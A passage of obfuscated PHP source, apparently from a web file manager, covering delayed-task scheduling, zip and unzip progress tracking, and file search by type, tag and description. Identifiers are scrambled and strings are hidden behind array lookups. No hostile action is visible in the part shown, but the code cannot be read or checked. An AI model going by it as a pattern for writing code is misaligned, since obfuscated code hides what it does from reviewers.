(!$ØíŸ§´î || timeFloat() - floatVal($ØíŸ§´î) >= $…èÕéêÖ) { Cache::set($³ÑÎ¿©Ä, timeFloat(), $…èÕéêÖ * 10); return !0; } return !1; } public static function timeLimitCall($¾…÷èÓ, $…œŞ¾ÃÅ, $ùàê´ï£, $‹òŞ¾×” = 5.0) { $Í°‡Ú« =& $_SERVER[ä¿÷‹µ±]; if (!$¾…÷èÓ || !$…œŞ¾ÃÅ) { return; } self::$asyncAdd = !0; $ì”©ıÉ× = $Í°‡Ú«[1764]; $âãå–×· = Cache::get($ì”©ıÉ×, !0); $¥´¦ÂÇó = array($Í°‡Ú«[1765] => timeFloat(), $Í°‡Ú«[1766] => timeFloat(), $Í°‡Ú«[264] => $…œŞ¾ÃÅ, $Í°‡Ú«[1759] => $ùàê´ï£, $Í°‡Ú«[203] => $‹òŞ¾×”); if (is_array($âãå–×·[$¾…÷èÓ])) { $¥´¦ÂÇó[$Í°‡Ú«[1766]] = $âãå–×·[$¾…÷èÓ][$Í°‡Ú«[1766]]; } if (is_array($âãå–×·[$¾…÷èÓ])) { if (timeFloat() - $âãå–×·[$¾…÷èÓ][$Í°‡Ú«[1765]] < $¥´¦ÂÇó[$Í°‡Ú«[203]] * 0.3) { return; } $¥´¦ÂÇó[$Í°‡Ú«[1766]] = $âãå–×·[$¾…÷èÓ][$Í°‡Ú«[1766]]; } $âãå–×·[$¾…÷èÓ] = $¥´¦ÂÇó; Cache::set($ì”©ıÉ×, $âãå–×·, 60); Cache::removeMemory($ì”©ıÉ×); write_log($Í°‡Ú«[1767] . $¾…÷èÓ . $Í°‡Ú«[71] . $…œŞ¾ÃÅ, $Í°‡Ú«[1761]); } public static function timeLimitCallLoop() { $°Ú›³³Ò =& $_SERVER[ä¿÷‹µ±]; $‰¸˜¼¨ = array($°Ú›³³Ò[1768]); $Òˆ€„æè = in_array(strtolower(ACTION), $‰¸˜¼¨); if (!$Òˆ€„æè && !self::$asyncAdd) { return; } $ÙåÖÊ± = $°Ú›³³Ò[1764]; $…œ¢Í· = Cache::get($ÙåÖÊ±, !0); if (!$…œ¢Í· || count($…œ¢Í·) <= 0) { return; } $Ùèîèõˆ = !1; $®é–‹¡ = timeFloat(); $¥úÛç‹ = array(); foreach ($…œ¢Í· as $üºÅ³µß => $Á¼ª·‚) { if ($®é–‹¡ - $Á¼ª·‚[$°Ú›³³Ò[1766]] > $Á¼ª·‚[$°Ú›³³Ò[203]]) { $Ùèîèõˆ = !0; try { Hook::apply($Á¼ª·‚[$°Ú›³³Ò[264]], $Á¼ª·‚[$°Ú›³³Ò[1759]]); write_log($°Ú›³³Ò[1769] . $üºÅ³µß . $°Ú›³³Ò[71] . $Á¼ª·‚[$°Ú›³³Ò[264]] . $°Ú›³³Ò[1770] . ACTION, $°Ú›³³Ò[1761]); } catch (Exception $ÃÛ¥â«) { } continue; } $¥úÛç‹[$üºÅ³µß] = $Á¼ª·‚; } if (!$Ùèîèõˆ) { return; } if (!$¥úÛç‹) { return Cache::remove($ÙåÖÊ±); } Cache::set($ÙåÖÊ±, $¥úÛç‹, 60); Cache::removeMemory($ÙåÖÊ±); } public static function finished($”…¹òö…, $¹Å‡å) { $À®¹ò =& $_SERVER[ä¿÷‹µ±]; if (!self::$syncTask) { self::$syncTask = array(); } self::$syncTask[] = array($À®¹ò[264] => $”…¹òö…, $À®¹ò[1759] => $¹Å‡å); } private static function finishedRun() { $»’ŒÁ©Æ =& $_SERVER[ä¿÷‹µ±]; if (!self::$syncTask) { return; } foreach (self::$syncTask as $üÒÒÀœç) { try { Hook::apply($üÒÒÀœç[$»’ŒÁ©Æ[264]], $üÒÒÀœç[$»’ŒÁ©Æ[1759]]); } catch (Exception $Ü÷Çƒ†) { } } } public static function autoRun() { self::finishedRun(); self::timeLimitCallLoop(); } } class TaskUnzip extends TaskFileTransfer { protected function startAfter() { $¿‰ÌÀŞŠ =& $_SERVER[ä¿÷‹µ±]; parent::startAfter(); Hook::bind($¿‰ÌÀŞŠ[1771], array($this, $¿‰ÌÀŞŠ[1772])); Hook::bind($¿‰ÌÀŞŠ[1216], array($this, $¿‰ÌÀŞŠ[1773])); $®®õ»ö¾ =& $this->task; $®®õ»ö¾[$¿‰ÌÀŞŠ[1774]] = $¿‰ÌÀŞŠ[1221]; if (!$®®õ»ö¾[$¿‰ÌÀŞŠ[1576]]) { $®®õ»ö¾[$¿‰ÌÀŞŠ[1576]] = LNG($¿‰ÌÀŞŠ[1775]); } } protected function endAfter() { $”ˆ¿°ÖÂ =& $_SERVER[ä¿÷‹µ±]; parent::endAfter(); Hook::unbind($”ˆ¿°ÖÂ[1771], array($this, $”ˆ¿°ÖÂ[1772])); Hook::unbind($”ˆ¿°ÖÂ[1216], array($this, $”ˆ¿°ÖÂ[1773])); } public function updateAfter() { $°ÒÑÍÙò =& $_SERVER[ä¿÷‹µ±]; $£“®ûë» =& $this->task; if (!$£“®ûë»[$°ÒÑÍÙò[805]] || !$£“®ûë»[$°ÒÑÍÙò[782]]) { return; } if ($£“®ûë»[$°ÒÑÍÙò[1774]] == $°ÒÑÍÙò[1221]) { $ˆÀø¦¯› = 0; if ($£“®ûë»[$°ÒÑÍÙò[1729]]) { $ˆÀø¦¯› = $£“®ûë»[$°ÒÑÍÙò[1730]] / $£“®ûë»[$°ÒÑÍÙò[1729]]; } $£“®ûë»[$°ÒÑÍÙò[1680]] = $ˆÀø¦¯› * 0.3; } else { if ($£“®ûë»[$°ÒÑÍÙò[1774]] == $°ÒÑÍÙò[313]) { $ˆÀø¦¯› = $£“®ûë»[$°ÒÑÍÙò[1679]] / $£“®ûë»[$°ÒÑÍÙò[805]]; $£“®ûë»[$°ÒÑÍÙò[1680]] = 0.3 + $ˆÀø¦¯› * 0.4; } else { if ($£“®ûë»[$°ÒÑÍÙò[1774]] == $°ÒÑÍÙò[107]) { $ÌìôÕÇ† = 0; if ($£“®ûë»[$°ÒÑÍÙò[1731]] == $°ÒÑÍÙò[107]) { $ÌìôÕÇ† = $£“®ûë»[$°ÒÑÍÙò[1730]]; } $ˆÀø¦¯› = ($£“®ûë»[$°ÒÑÍÙò[1734]] + $ÌìôÕÇ†) / $£“®ûë»[$°ÒÑÍÙò[782]]; $£“®ûë»[$°ÒÑÍÙò[1680]] = 0.3 + 0.4 + $ˆÀø¦¯› * 0.3; } } } if ($£“®ûë»[$°ÒÑÍÙò[1680]] > 0) { $Ãšíö™¼ = timeFloat() - $£“®ûë»[$°ÒÑÍÙò[1682]] - $£“®ûë»[$°ÒÑÍÙò[1685]]; $£“®ûë»[$°ÒÑÍÙò[1686]] = $Ãšíö™¼ * (1 - $£“®ûë»[$°ÒÑÍÙò[1680]]) / $£“®ûë»[$°ÒÑÍÙò[1680]]; } } public function addFile($üÏÜŠö›) { $‡Ê‘¢  =& $_SERVER[ä¿÷‹µ±]; $Ì§¿Õà‰ =& $this->task; $”‰ù¹ûè = IO::info($üÏÜŠö›); $Ì§¿Õà‰[$‡Ê‘¢ [1727]] = $”‰ù¹ûè[$‡Ê‘¢ [32]]; $Ì§¿Õà‰[$‡Ê‘¢ [1729]] = $”‰ù¹ûè[$‡Ê‘¢ [76]]; $Ì§¿Õà‰[$‡Ê‘¢ [1730]] = 0; $Ì§¿Õà‰[$‡Ê‘¢ [1086]] = $‡Ê‘¢ [1750]; $Ì§¿Õà‰[$‡Ê‘¢ [1731]] = $‡Ê‘¢ [1221]; $Ì§¿Õà‰[$‡Ê‘¢ [782]] = $”‰ù¹ûè[$‡Ê‘¢ [76]]; $Ì§¿Õà‰[$‡Ê‘¢ [805]] = 1; $¾ á‡×» = 0; $Ì§¿Õà‰[$‡Ê‘¢ [1738]] = array($‡Ê‘¢ [1739] => $¾ á‡×» + 1, $‡Ê‘¢ [420] => $”‰ù¹ûè[$‡Ê‘¢ [32]], $‡Ê‘¢ [84] => $”‰ù¹ûè[$‡Ê‘¢ [84]], $‡Ê‘¢ [519] => $”‰ù¹ûè[$‡Ê‘¢ [519]] ? $”‰ù¹ûè[$‡Ê‘¢ [519]] : $”‰ù¹ûè[$‡Ê‘¢ [84]]); $this->update(); } public function unzipAfter($î¥Ó…) { $ò‚Şèæ¸ =& $_SERVER[ä¿÷‹µ±]; $ğ¨Ğ¼Ş• =& $this->task; $ğ¨Ğ¼Ş•[$ò‚Şèæ¸[1774]] = $ò‚Şèæ¸[107]; $ûÍöÂÚ = IO::infoWithChildren($î¥Ó…); $öœÜ¥À¡ = 0; $ğ¨Ğ¼Ş•[$ò‚Şèæ¸[1738]] = array($ò‚Şèæ¸[1739] => $öœÜ¥À¡ + 1, $ò‚Şèæ¸[420] => $ûÍöÂÚ[$ò‚Şèæ¸[32]], $ò‚Şèæ¸[84] => $ûÍöÂÚ[$ò‚Şèæ¸[84]], $ò‚Şèæ¸[519] => $ûÍöÂÚ[$ò‚Şèæ¸[519]] ? $ûÍöÂÚ[$ò‚Şèæ¸[519]] : $ûÍöÂÚ[$ò‚Şèæ¸[84]]); if ($ûÍöÂÚ[$ò‚Şèæ¸[33]] == $ò‚Şèæ¸[199]) { $ğ¨Ğ¼Ş•[$ò‚Şèæ¸[805]] = 1; } else { $ğ¨Ğ¼Ş•[$ò‚Şèæ¸[805]] = $ûÍöÂÚ[$ò‚Şèæ¸[79]][$ò‚Şèæ¸[77]]; } $ğ¨Ğ¼Ş•[$ò‚Şèæ¸[1086]] = $ò‚Şèæ¸[12]; $ğ¨Ğ¼Ş•[$ò‚Şèæ¸[1731]] = 0; $ğ¨Ğ¼Ş•[$ò‚Şèæ¸[1679]] = 0; $ğ¨Ğ¼Ş•[$ò‚Şèæ¸[1729]] = 0; $ğ¨Ğ¼Ş•[$ò‚Şèæ¸[1730]] = 0; $ğ¨Ğ¼Ş•[$ò‚Şèæ¸[1727]] = $ò‚Şèæ¸[12]; $ğ¨Ğ¼Ş•[$ò‚Şèæ¸[1734]] = 0; $ğ¨Ğ¼Ş•[$ò‚Şèæ¸[782]] = $ûÍöÂÚ[$ò‚Şèæ¸[76]]; $this->update(); self::log($ò‚Şèæ¸[1776] . json_encode(array($ğ¨Ğ¼Ş•, $ûÍöÂÚ))); } public function nameParse($Ğø­Ê’á) { $Û˜ƒÂ¿Æ =& $_SERVER[ä¿÷‹µ±]; $Âœ§Í ½ =& $this->task; if ($Âœ§Í ½[$Û˜ƒÂ¿Æ[1774]] == $Û˜ƒÂ¿Æ[1221]) { $Âœ§Í ½[$Û˜ƒÂ¿Æ[1774]] = $Û˜ƒÂ¿Æ[313]; $Âœ§Í ½[$Û˜ƒÂ¿Æ[1734]] = 0; $Âœ§Í ½[$Û˜ƒÂ¿Æ[782]] = 0; } $¬ÛĞëƒŒ = get_path_this($Ğø­Ê’á); if (strstr($¬ÛĞëƒŒ, $Û˜ƒÂ¿Æ[10])) { $Âœ§Í ½[$Û˜ƒÂ¿Æ[1679]] += 1; $Âœ§Í ½[$Û˜ƒÂ¿Æ[805]] += 1; } $Âœ§Í ½[$Û˜ƒÂ¿Æ[1727]] = $Ğø­Ê’á; $this->update(); } } class TaskZip extends TaskFileTransfer { protected function startAfter() { $Êƒ¿ƒÕì =& $_SERVER[ä¿÷‹µ±]; parent::startAfter(); Hook::bind($Êƒ¿ƒÕì[1777], array($this, $Êƒ¿ƒÕì[1772])); $öÒ½‚ß¯ =& $this->task; $öÒ½‚ß¯[$Êƒ¿ƒÕì[1774]] = $Êƒ¿ƒÕì[1221]; if (!$öÒ½‚ß¯[$Êƒ¿ƒÕì[1576]]) { $öÒ½‚ß¯[$Êƒ¿ƒÕì[1576]] = LNG($Êƒ¿ƒÕì[1778]); } } protected function endAfter() { $‹Å¶”Ò† =& $_SERVER[ä¿÷‹µ±]; parent::endAfter(); Hook::unbind($‹Å¶”Ò†[1777], array($this, $‹Å¶”Ò†[1772])); } public function updateAfter() { $÷êâ‡à¸ =& $_SERVER[ä¿÷‹µ±]; $¥¬Êü‰ =& $this->task; if (!$¥¬Êü‰[$÷êâ‡à¸[805]] || !$¥¬Êü‰[$÷êâ‡à¸[782]]) { return; } if ($¥¬Êü‰[$÷êâ‡à¸[1774]] == $÷êâ‡à¸[1221]) { $”ÉëÚ¤¸ = $¥¬Êü‰[$÷êâ‡à¸[1730]]; if ($¥¬Êü‰[$÷êâ‡à¸[1731]] != $÷êâ‡à¸[1221]) { $”ÉëÚ¤¸ = 0; } $Ÿ¨Å¼ú› = ($¥¬Êü‰[$÷êâ‡à¸[1734]] + $”ÉëÚ¤¸) / $¥¬Êü‰[$÷êâ‡à¸[782]]; $¥¬Êü‰[$÷êâ‡à¸[1680]] = $Ÿ¨Å¼ú› * 0.3; } else { if ($¥¬Êü‰[$÷êâ‡à¸[1774]] == $÷êâ‡à¸[313]) { $Ÿ¨Å¼ú› = $¥¬Êü‰[$÷êâ‡à¸[1679]] / $¥¬Êü‰[$÷êâ‡à¸[805]]; $¥¬Êü‰[$÷êâ‡à¸[1680]] = 0.3 + $Ÿ¨Å¼ú› * 0.5; } else { if ($¥¬Êü‰[$÷êâ‡à¸[1774]] == $÷êâ‡à¸[107]) { $Ÿ¨Å¼ú› = 0; if ($¥¬Êü‰[$÷êâ‡à¸[1729]]) { $Ÿ¨Å¼ú› = $¥¬Êü‰[$÷êâ‡à¸[1730]] / $¥¬Êü‰[$÷êâ‡à¸[1729]]; } $¥¬Êü‰[$÷êâ‡à¸[1680]] = 0.3 + 0.5 + $Ÿ¨Å¼ú› * 0.2; } } } if ($¥¬Êü‰[$÷êâ‡à¸[1680]] > 0) { $ˆô¦¡¤ì = timeFloat() - $¥¬Êü‰[$÷êâ‡à¸[1682]] - $¥¬Êü‰[$÷êâ‡à¸[1685]]; $¥¬Êü‰[$÷êâ‡à¸[1686]] = $ˆô¦¡¤ì * (1 - $¥¬Êü‰[$÷êâ‡à¸[1680]]) / $¥¬Êü‰[$÷êâ‡à¸[1680]]; } } public function copyFileStart($œüÍ¦‰¶, $¶å”±‘, $Ä‰Èâ, $òÇàœÓ—, $á²ËÄ , $¤åØğ¶Ş) { $Èú¾ÆÅ­ =& $_SERVER[ä¿÷‹µ±]; parent::copyFileStart($œüÍ¦‰¶, $¶å”±‘, $Ä‰Èâ, $òÇàœÓ—, $á²ËÄ , $¤åØğ¶Ş); $ï¾¡¶Ó =& $this->task; if ($ï¾¡¶Ó[$Èú¾ÆÅ­[1774]] == $Èú¾ÆÅ­[313]) { $ï¾¡¶Ó[$Èú¾ÆÅ­[1774]] = $Èú¾ÆÅ­[107]; } $this->update(); } public function copyFileEnd($çûŞíş, $ŒıÖÌÅò, $Ê¿‹¦ÅÎ, $š¯Û¸¢û, $½ò®ô, $—¡ğ¸¿) { $æœ’ÛğÍ =& $_SERVER[ä¿÷‹µ±]; $¼üõ§² =& $this->task; $¼üõ§²[$æœ’ÛğÍ[1730]] = $¼üõ§²[$æœ’ÛğÍ[1729]]; $¼üõ§²[$æœ’ÛğÍ[1734]] += $¼üõ§²[$æœ’ÛğÍ[1729]]; $¼üõ§²[$æœ’ÛğÍ[1731]] = $æœ’ÛğÍ[12]; $this->update(); } public function nameParse($ãÁâêÒù) { $·ËìèÇ° =& $_SERVER[ä¿÷‹µ±]; $Ú¸×³áõ =& $this->task; if ($Ú¸×³áõ[$·ËìèÇ°[1679]] < $Ú¸×³áõ[$·ËìèÇ°[805]]) { $ş­ıÀøñ = get_path_this($ãÁâêÒù); if (strstr($ş­ıÀøñ, $·ËìèÇ°[10])) { $Ú¸×³áõ[$·ËìèÇ°[1679]] += 1; } } if ($Ú¸×³áõ[$·ËìèÇ°[1774]] == $·ËìèÇ°[1221]) { $Ú¸×³áõ[$·ËìèÇ°[1774]] = $·ËìèÇ°[313]; } $Ú¸×³áõ[$·ËìèÇ°[1727]] = $ãÁâêÒù; $this->update(); } } goto dĞâñÀŞ…á; e†ĞÍ’…¢ : class SourceListSearchModel extends SourceListMoveModel { public static function fileTypeWhere($›Ğ¿úÜÏ) { $¢íÒîÄ€ =& $_SERVER[ä¿÷‹µ±]; $œı¶ú¯ = KodIO::fileTypeList(); $İßÚ¯ã = $œı¶ú¯[$›Ğ¿úÜÏ]; if (!$İßÚ¯ã) { return array(); } $Çñ¿à¬ = $İßÚ¯ã[$¢íÒîÄ€[174]]; $Ãê†â¨Ã = $¢íÒîÄ€[7]; if (!$İßÚ¯ã[$¢íÒîÄ€[174]]) { $ôÒµß’û = array_to_keyvalue($œı¶ú¯, $¢íÒîÄ€[12], $¢íÒîÄ€[174]); $Çñ¿à¬ = implode($¢íÒîÄ€[50], $ôÒµß’û); $Ãê†â¨Ã = $¢íÒîÄ€[2101]; } $¢ŠúÓ£‡ = explode($¢íÒîÄ€[50], trim($Çñ¿à¬, $¢íÒîÄ€[50])); return array($Ãê†â¨Ã, $¢ŠúÓ£‡); } public function listPathType($ñÉ÷ú²º) { $ÀœÎ‹ºª =& $_SERVER[ä¿÷‹µ±]; $ÏÛ‘ëƒû = $this->fileTypeWhere($ñÉ÷ú²º); if (!$ÏÛ‘ëƒû) { return array(); } $·â±Ù“ = USER_ID; $ÙêÚ¥å = Model($ÀœÎ‹ºª[535])->getInfo($·â±Ù“); $ß½Œü£¬ = array($ÀœÎ‹ºª[586] => SourceModel::TYPE_USER, $ÀœÎ‹ºª[521] => array($ÀœÎ‹ºª[550], $ÀœÎ‹ºª[531] . $ÙêÚ¥å[$ÀœÎ‹ºª[86]][$ÀœÎ‹ºª[402]] . $ÀœÎ‹ºª[551]), $ÀœÎ‹ºª[587] => $·â±Ù“, $ÀœÎ‹ºª[583] => 0, $ÀœÎ‹ºª[584] => $ÏÛ‘ëƒû); return $this->listSource($ß½Œü£¬); } public function listSearch($óÜÕö¹ç, $çÓÅÅ²Ñ = 300) { $şü¥…Ğ =& $_SERVER[ä¿÷‹µ±]; if (isset($óÜÕö¹ç[$şü¥…Ğ[1944]]) && $óÜÕö¹ç[$şü¥…Ğ[1944]]) { $óÜÕö¹ç[$şü¥…Ğ[1944]] = str_replace($şü¥…Ğ[384], $şü¥…Ğ[2102], trim($óÜÕö¹ç[$şü¥…Ğ[1944]])); } $œ’…ªª« = $this->_parseSearchWhere($óÜÕö¹ç); if (!isset($œ’…ªª«[$şü¥…Ğ[431]])) { $œ’…ªª«[$şü¥…Ğ[431]] = 0; } $·ã‘ÖÈ× = $şü¥…Ğ[2103]; $É‹ôœ•™ = $œ’…ªª«; $×¥ÚÌñ¤ = $·ã‘ÖÈ×; $this->_listSearchBindPinyin($óÜÕö¹ç, $œ’…ªª«, $·ã‘ÖÈ×); $this->alias($şü¥…Ğ[446])->_makeOrder(); $œ’…ªª« = $this->parseWhereLike($œ’…ªª«); $ë¨ŞªÔ¬ = $this->distinct(!0)->field($·ã‘ÖÈ×)->where($œ’…ªª«)->selectPage($çÓÅÅ²Ñ); if ($GLOBALS[$şü¥…Ğ[6]][$şü¥…Ğ[381]][$şü¥…Ğ[382]] && Input::check($óÜÕö¹ç[$şü¥…Ğ[1944]], $şü¥…Ğ[593]) && $ë¨ŞªÔ¬[$şü¥…Ğ[366]][$şü¥…Ğ[353]] == 1 && $ë¨ŞªÔ¬[$şü¥…Ğ[366]][$şü¥…Ğ[367]] == 0) { $ë¨ŞªÔ¬ = $this->distinct(!0)->field($·ã‘ÖÈ×)->where($É‹ôœ•™)->limit(1000)->select(); $ë¨ŞªÔ¬ = array_page_split($ë¨ŞªÔ¬, !1, $çÓÅÅ²Ñ); } $this->_listSearchFileContent($ë¨ŞªÔ¬, $óÜÕö¹ç, $×¥ÚÌñ¤, $É‹ôœ•™); $this->_listSearchDesc($ë¨ŞªÔ¬, $óÜÕö¹ç, $×¥ÚÌñ¤); $this->_listSearchTag($ë¨ŞªÔ¬, $óÜÕö¹ç, $×¥ÚÌñ¤); $this->_listSearchGroupTag($ë¨ŞªÔ¬, $óÜÕö¹ç, $×¥ÚÌñ¤); $this->_listDataApply($ë¨ŞªÔ¬[$şü¥…Ğ[369]]); $this->_listMake($ë¨ŞªÔ¬); return $ë¨ŞªÔ¬; } private function _listSearchFileContent(&$ÈÊùäƒ, $—¢ïü¨­, $¾½¯¸†², $ÍìƒáØ) { $«Ÿğ·†ñ =& $_SERVER[ä¿÷‹µ±]; if (!$—¢ïü¨­[$«Ÿğ·†ñ[1944]] || $ÈÊùäƒ[$«Ÿğ·†ñ[366]][$«Ÿğ·†ñ[353]] > 1) { return; } if (!isset($ÍìƒáØ[$«Ÿğ·†ñ[32]]) || !is_array($—¢ïü¨­[$«Ÿğ·†ñ[468]])) { return; } $ÍìƒáØ[$«Ÿğ·†ñ[468]] = array($«Ÿğ·†ñ[7], $—¢ïü¨­[$«Ÿğ·†ñ[468]]); unset($ÍìƒáØ[$«Ÿğ·†ñ[32]]); unset($—¢ïü¨­[$«Ÿğ·†ñ[468]]); $í·ã¹™Ü = $this->field($¾½¯¸†²)->where($ÍìƒáØ)->limit($«Ÿğ·†ñ[2104])->select(); if (!$í·ã¹™Ü || count($í·ã¹™Ü) == 0) { return; } $ÈÊùäƒ[$«Ÿğ·†ñ[369]] = array_merge($í·ã¹™Ü, $ÈÊùäƒ[$«Ÿğ·†ñ[369]]); $ÈÊùäƒ[$«Ÿğ·†ñ[366]][$«Ÿğ·†ñ[367]] += count($í·ã¹™Ü); } private function _listSearchTag(&$•…—À¸Á, $ˆ Ö¤ã½, $²˜àôˆã) { $ß©¦İö· =& $_SERVER[ä¿÷‹µ±]; if (!$ˆ Ö¤ã½[$ß©¦İö·[1944]] || $•…—À¸Á[$ß©¦İö·[366]][$ß©¦İö·[353]] > 1) { return; } $“±­Ò„ö = Model($ß©¦İö·[2105])->listData(); $ÓÆü€â = array(); $á§İ–ü÷ = $ˆ Ö¤ã½[$ß©¦İö·[1944]]; foreach ($“±­Ò„ö as $¼Çáí”¸) { $Å•…÷’× = $¼Çáí”¸[$ß©¦İö·[32]]; $ëµ„şŠ = str_replace($ß©¦İö·[53], $ß©¦İö·[12], Pinyin::get($Å•…÷’×)); if (stripos($Å•…÷’×, $á§İ–ü÷) !== !1 || stripos($ëµ„şŠ, $á§İ–ü÷) !== !1) { $ÓÆü€â[] = $¼Çáí”¸[$ß©¦İö·[399]]; } } if (!$ÓÆü€â) { return; } $­¹ø©äğ = array($ß©¦İö·[426] => array($ß©¦İö·[7], $ÓÆü€â), $ß©¦İö·[1678] => USER_ID); $¨Ö˜Î = Model($ß©¦İö·[428])->field($ß©¦İö·[84])->where($­¹ø©äğ)->select(); $¨Ö˜Î = array_to_keyvalue($¨Ö˜Î, $ß©¦İö·[12], $ß©¦İö·[84]); $”Ÿ°çŞ = array_unique($¨Ö˜Î); $this->_listSearchMerge($•…—À¸Á, $ˆ Ö¤ã½, $²˜àôˆã, $”Ÿ°çŞ); } private function _listSearchDesc(&$¢ğºò¾, $Ú–ˆóõ, $âô°×Ç‘) { $š½óÚÕ =& $_SERVER[ä¿÷‹µ±]; if (!$Ú–ˆóõ[$š½óÚÕ[1944]] || $¢ğºò¾[$š½óÚÕ[366]][$š½óÚÕ[353]] > 1) { return; } $€¢ô òØ = array($š½óÚÕ[94] => $š½óÚÕ[453], $š½óÚÕ[374] => array($š½óÚÕ[383], $š½óÚÕ[1946] . $Ú–ˆóõ[$š½óÚÕ[1944]] . $š½óÚÕ[1946])); $ÛÑÌ¸‹ = !1; if ($ÛÑÌ¸‹) { $¦Öªğ÷ = $this->listSearchChildren($Ú–ˆóõ[$š½óÚÕ[432]]); $¦Öªğ÷ = array_unique($¦Öªğ÷); if (!$¦Öªğ÷) { return; } $€¢ô òØ[$š½óÚÕ[402]] = array($š½óÚÕ[7], $¦Öªğ÷); } $­ËÕğ…ß = Model($š½óÚÕ[569])->field($š½óÚÕ[402])->where($€¢ô òØ)->limit(5000)->select(); $¸’Ùâ¹ß = array_to_keyvalue($­ËÕğ…ß, $š½óÚÕ[12], $š½óÚÕ[402]); $this->_listSearchMerge($¢ğºò¾, $Ú–ˆóõ, $âô°×Ç‘, $¸’Ùâ¹ß); } private function _listSearchGroupTag(&$œ«ÂÇá¸, $Êççïèõ, $›®Å¡—¯) { $ş¦¸Æ =& $_SERVER[ä¿÷‹µ±]; if (!$Êççïèõ[$ş¦¸Æ[1944]] || $œ«ÂÇá¸[$ş¦¸Æ[366]][$ş¦¸Æ[353]] > 1 || !$Êççïèõ[$ş¦¸Æ[432]]) { return; } $ƒÃÁàÚÏ = $this->sourceInfo($Êççïèõ[$ş¦¸Æ[432]]); if (!$ƒÃÁàÚÏ || $ƒÃÁàÚÏ[$ş¦¸Æ[411]] != SourceModel::TYPE_GROUP) { return; } $Ô€ˆŠ·Ú = $ƒÃÁàÚÏ[$ş¦¸Æ[505]]; $÷Âò°ìÄ = Model($ş¦¸Æ[2106])->get($Ô€ˆŠ·Ú); $çºÈÇ£û = array(); $¸ú¯™ë× = $Êççïèõ[$ş¦¸Æ[1944]]; foreach ($÷Âò°ìÄ[$ş¦¸Æ[369]] as $˜ò¶¦©à) { $ò€ù¥µğ = $˜ò¶¦©à[$ş¦¸Æ[32]]; $ŠÛöÒ × = str_replace($ş¦¸Æ[53], $ş¦¸Æ[12], Pinyin::get($ò€ù¥µğ)); if (stripos($ò€ù¥µğ, $¸ú¯™ë×) !== !1 || stripos($ŠÛöÒ ×, $¸ú¯™ë×) !== !1) { $çºÈÇ£û[] = $˜ò¶¦©à[$ş¦¸Æ[399]]; } } if (!$çºÈÇ£û) { return; } $²âÂÕŸ = array($ş¦¸Æ[426] => array($ş¦¸Æ[7], $çºÈÇ£û), $ş¦¸Æ[1678] => 0, $ş¦¸Æ[33] => $ş¦¸Æ[1966] . $Ô€ˆŠ·Ú); $È¨ÁÔ± = Model($ş¦¸Æ[428])->field($ş¦¸Æ[84])->where($²âÂÕŸ)->select(); $È¨ÁÔ± = array_to_keyvalue($È¨ÁÔ±, $ş¦¸Æ[12], $ş¦¸Æ[84]); $§ÍÒ“Â = array_unique($È¨ÁÔ±); $this->_listSearchMerge($œ«ÂÇá¸, $Êççïèõ, $›®Å¡—¯, $§ÍÒ“Â); } private function _listSearchMerge(&$“û¶ğÕ, $‚Ğê£ß², $å¯ÅßÖ¥, $Í‰ŞÊí) { $ÎÈÈ¨Èä =& $_SERVER[ä¿÷‹µ±]; if (!$Í‰ŞÊí) { return; } $µ¡Ü ¹ = array_to_keyvalue($“û¶ğÕ[$ÎÈÈ¨Èä[369]], $ÎÈÈ¨Èä[12], $ÎÈÈ¨Èä[402]); $˜ùŞ¸› = array_diff($Í‰ŞÊí, $µ¡Ü ¹); if (!$˜ùŞ¸›) { return; } $¥ò¢¥éì = array($ÎÈÈ¨Èä[402] => array($ÎÈÈ¨Èä[7], $˜ùŞ¸›)); $Æ…¡Çƒ = $this->field($å¯ÅßÖ¥)->where($¥ò¢¥éì)->select(); if (!$Æ…¡Çƒ) { return; } $™‡êÈ€Í = array(); foreach ($Æ…¡Çƒ as $š¬¾ü¹Å) { if ($this->_listSearchFilter($š¬¾ü¹Å, $‚Ğê£ß²)) { $™‡êÈ€Í[] = $š¬¾ü¹Å; } } $“û¶ğÕ[$ÎÈÈ¨Èä[369]] = array_merge($™‡êÈ€Í, $“û¶ğÕ[$ÎÈÈ¨Èä[369]]); $“û¶ğÕ[$ÎÈÈ¨Èä[366]][$ÎÈÈ¨Èä[367]] += count($™‡êÈ€Í); } private function _listSearchFilter($„ú¯–·–, $Åœ±¿àô) { $‡ãòäõ =& $_SERVER[ä¿÷‹µ±]; $ïà€–Û = $„ú¯–·–[$‡ãòäõ[410]] == $‡ãòäõ[88]; if (!strstr($„ú¯–·–[$‡ãòäõ[521]], $‡ãòäõ[50] . $Åœ±¿àô[$‡ãòäõ[432]] . $‡ãòäõ[50])) { return !1; } if (isset($Åœ±¿àô[$‡ãòäõ[412]]) && $Åœ±¿àô[$‡ãòäõ[412]] != $‡ãòäõ[1905]) { if ($Åœ±¿àô[$‡ãòäõ[412]] == $‡ãòäõ[75] && !$ïà€–Û) { return !1; } if ($Åœ±¿àô[$‡ãòäõ[412]] != $‡ãòäõ[75] && $ïà€–Û) { return !1; } if (!strstr($„ú¯–·–[$‡ãòäõ[174]], $‡ãòäõ[50] . $Åœ±¿àô[$‡ãòäõ[412]] . $‡ãòäõ[50])) { return !1; } } if (isset($Åœ±¿àô[$‡ãòäõ[2107]]) && $Åœ±¿àô[$‡ãòäõ[2107]] < $„ú¯–·–[$‡ãòäõ[76]]) { return !1; } if (isset($Åœ±¿àô[$‡ãòäõ[2108]]) && $Åœ±¿àô[$‡ãòäõ[2108]] > $„ú¯–·–[$‡ãòäõ[76]]) { return !1; } if (isset($Åœ±¿àô[$‡ãòäõ[600]]) && $Åœ±¿àô[$‡ãòäõ[600]] != $„ú¯–·–[$‡ãòäõ[456]]) { return !1; } return !0; } public function listSearchChildren($ü¤•ó£, $º÷Ìåè´ = 5000) { $åºõ„ıà =& $_SERVER[ä¿÷‹µ±]; $ª±¬ı† = array(); $˜ŠèÈõ = $this->sourceInfo($ü¤•ó£); $³Íş’×½ = array($åºõ„ıà[521] => array($åºõ„ıà[383], $˜ŠèÈõ[$åºõ„ıà[521]] . $˜ŠèÈõ[$åºõ„ıà[402]] . $åºõ„ıà[551])); $”®¼ªä = $this->field($åºõ„ıà[76])->where($³Íş’×½)->limit($º÷Ìåè´ + 1)->select(); $™ı•»â¢ = is_array($”®¼ªä) ? count($”®¼ªä) : 0; if ($™ı•»â¢ > $º÷Ìåè´) { return $this->_listSearchChildrenNear($ü¤•ó£, $º÷Ìåè´); } $æ¡÷ä§ó = $this->field($åºõ„ıà[402])->where($³Íş’×½)->select(); $ª±¬ı† = array_to_keyvalue($æ¡÷ä§ó, $åºõ„ıà[12], $åºõ„ıà[402]); return $ª±¬ı†; } private function _listSearchChildrenNear($¢Ôé©Í, 